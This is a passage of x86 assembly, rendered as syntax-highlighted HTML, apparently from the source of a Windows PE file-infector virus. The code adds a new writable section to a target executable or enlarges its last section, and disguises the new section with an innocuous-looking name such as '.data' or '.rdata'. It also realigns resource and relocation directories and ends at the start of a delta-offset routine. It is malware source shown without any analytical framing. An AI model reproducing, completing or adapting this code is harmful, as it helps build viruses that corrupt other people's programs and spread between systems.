       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_our_sizes</span><span class="sc0">                          </span><span class="sc1">;and set our sizes</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">done_adding</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_last</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;if we are not last, we</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;must rearrange both</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;headers</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_section_destination</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newsize</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">std</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                                   </span><span class="sc1">;and move the last section</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">                                         </span><span class="sc1">;below our new section</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsectionheader</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_our_sizes</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newsize</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">align_to_sectionalign</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">optionalheader</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">situation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">RESOURCES_LAST</span><span class="sc0">         </span><span class="sc1">;check if we must fix</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">then_relocs</span><span class="sc0">                             </span><span class="sc1">;resources</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_DataDirectory.DE_Resource.DD_VirtualAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RealignResources</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">done_adding</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">then_relocs</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_DataDirectory.DE_BaseReloc.DD_VirtualAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RealignRelocs</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">done_adding</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">set_our_sizes</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_our_name</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newraw</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;set our new raw size</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;and our virtual size</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">align_to_filealign</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc4">+</span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc4">+\
</span><span class="sc0">                                     </span><span class="sc5">IMAGE_SCN_CNT_INITIALIZED_DATA</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">done_adding</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">set_our_name</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">optionalheader</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sizeofoptionalheader</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">numberofsections</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">section_names_number</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">compare_names</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">section_names</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">section_names_number</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">compare</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">mark_it</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">next_name</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">compare</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_section</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">mark_it</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_section</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">next_section</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">compare_names</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">choose_safe</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">section_names</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">choose_name</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">done_choosing</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">choose_name</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">looping</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">;don't count it</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">looping</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">choose_name</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">done_choosing</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">choose_safe</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">safe</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">done_choosing</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">section_names</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;our new section not so</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"DATA"</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;random name...</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">".data"</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">".idata"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">".udata"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"BSS"</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">".rdata"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">".sdata"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">".edata"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">section_names_number</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">section_names</span><span class="sc4">)/</span><span class="sc2">9</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">safe</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">increase_last_section</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">method</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">METHOD_INCREASE_LAST</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsectionheader</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newraw</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newsize</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_section_destination</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finaldestination</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc4">+</span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CalculateDelta</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsectionheader</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;go to last section</span><span class="sc0">
